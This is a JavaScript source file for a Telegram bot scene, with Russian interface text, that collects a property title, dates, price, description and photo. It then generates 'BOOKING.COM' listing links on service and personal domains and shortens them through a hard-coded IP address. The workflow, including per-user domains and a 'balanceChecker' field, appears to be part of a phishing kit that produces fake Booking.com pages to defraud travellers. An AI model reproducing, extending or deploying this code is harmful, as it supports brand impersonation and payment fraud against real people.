const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, User, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const myAd = require("../../commands/myAd");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");

const downloadImage = require("../../helpers/downloadImage");


const scene = new WizardScene(
  "create_link_booking_eu",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "booking_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки BOOKING.COM");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const user = await User.findOne({ where: { id: ctx.from.id } });
      await ctx.deleteMessage().catch((err) => err);
      await ctx.scene
        .reply("Введите название объекта", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                `${!user.LastTitle ? `Пусто` : user.LastTitle}`,
                `${!user.LastTitle ? `none` : user.LastTitle}`
              ),
            ],

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const user = await User.findOne({ where: { id: ctx.from.id } });

      if (!ctx.message?.text && ctx.callbackQuery?.data != `${user.LastTitle}`)
        return ctx.wizard.prevStep();

      if (ctx.callbackQuery?.data == `${user.LastTitle}`) {
        ctx.scene.state.data.title = `${user.LastTitle}`;
      } else ctx.scene.state.data.title = ctx.message.text;

      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите дату заезда", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.date1 = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите дата отъезда", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.date2 = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  // Шаг выбора валюты
  async (ctx) => {
    try {
      await ctx.scene.reply("Выберите валюту", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Евро (€)", "EUR"),
            Markup.callbackButton("Доллар ($)", "USD"),
          ],
          [Markup.callbackButton("Фунты (£)", "GBP")],

          // [Markup.callbackButton("Без цены", "NO_PRICE")],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    if ("callback_query" in ctx.update) {
      const choice = ctx.update.callback_query.data; // 'EUR', 'USD', 'GBP' или 'NO_PRICE'

      let currencySymbol;
      if (choice === "NO_PRICE") {
        ctx.scene.state.data.currency = null;
        ctx.scene.state.data.price = null;
        // Здесь можно добавить следующий шаг вашего сценария, не требующий ввода цены
        return ctx.wizard.nextStep();
      } else {
        ctx.scene.state.data.currency = choice;
        if (choice === "EUR") {
          currencySymbol = "€";
        } else if (choice === "USD") {
          currencySymbol = "$";
        } else {
          // Assuming any other choice is "GBP"
          currencySymbol = "£";
        }
        await ctx.scene.reply(
          `Введите цену объявления (только число, в ${currencySymbol}):`,
          {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          }
        );
        return ctx.wizard.next();
      }
    } else {
      return ctx.wizard.prevStep();
    }
  },

async (ctx) => {
  try {
    var amount = parseFloat(ctx.message.text);
    if (isNaN(amount)) return ctx.wizard.prevStep();
    if (amount % 1 === 0) amount = amount.toFixed(0);
    else amount = amount.toFixed(2);

    let currencySymbol;
    if (ctx.scene.state.data.currency === "EUR") {
      currencySymbol = "€";
    } else if (ctx.scene.state.data.currency === "USD") {
      currencySymbol = "$";
    } else { // Assuming any other choice is "GBP"
      currencySymbol = "£";
    }
    amount = amount + ` ${currencySymbol}`;

    ctx.scene.state.data.price = amount;

    return ctx.wizard.nextStep();
  } catch (err) {
    ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    return ctx.scene.leave();
  }
},




  async (ctx) => {
    try {
      const user = await User.findOne({ where: { id: ctx.from.id } });
      await ctx.deleteMessage().catch((err) => err);
      await ctx.scene
        .reply("Введите описание объекта", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                `${!user.LastAbout ? `Пусто` : user.LastAbout}`,
                `${!user.LastAbout ? `none` : user.LastAbout}`
              ),
            ],

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const user = await User.findOne({ where: { id: ctx.from.id } });

      if (!ctx.message?.text && ctx.callbackQuery?.data != `${user.LastAbout}`)
        return ctx.wizard.prevStep();

      if (ctx.callbackQuery?.data == `${user.LastAbout}`) {
        ctx.scene.state.data.about = `${user.LastAbout}`;
      } else ctx.scene.state.data.about = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

 
  
 

  async (ctx) => {
    try {
      const user = await User.findOne({ where: { id: ctx.from.id } });

      await ctx.scene
        .reply("Отправьте изображение в сжатом формате", {
          reply_markup: Markup.inlineKeyboard([
            // [Markup.callbackButton(`Последнее фото`, `LastPhoto`)],

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[1].file_id
      );
      ctx.wizard.state.data.photo = await downloadImage(photo_link);
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err)
      if (ctx.message.text) return ctx.wizard.prevStep();

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "booking_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      console.log(ctx.scene.state.data);
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        price: ctx.scene.state.data.price,
version:"1",
        userId: ctx.from.id,
        balanceChecker: false,
        ...ctx.scene.state.data,
        LastTitle: ctx.scene.state.data.title,
        serviceCode: "booking_eu",
      });

      await User.update(
        {
          LastTitle: ctx.scene.state.data.title,
          LastAbout: ctx.scene.state.data.about,
          LastPhoto: ctx.scene.state.data.photo,
        },
        {
          where: {
            id: ctx.from.id,
          },
        }
      );
      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
      }); 
       
      let reductionUrl; 
       
      try { 
        const reduction = await axios.post( 
          "http://185.208.158.144/api/create", 
          { 
            target: `https://${service.domain}/${ad.id}`, 
            domain: service.shortlink || ctx.state.bot.shortlink, 
          }, 
          { timeout: 2000 } 
        ); 
       
        reductionUrl = reduction.data.url; 
      } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
       
        if (error.code === 'ECONNABORTED') { 
          console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
          console.warn("Сервер сокращений недоступен."); 
        } else { 
          console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
       
        reductionUrl = null; // корректный fallback 
      } 
       
      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
       
      await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
      }); 
       
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
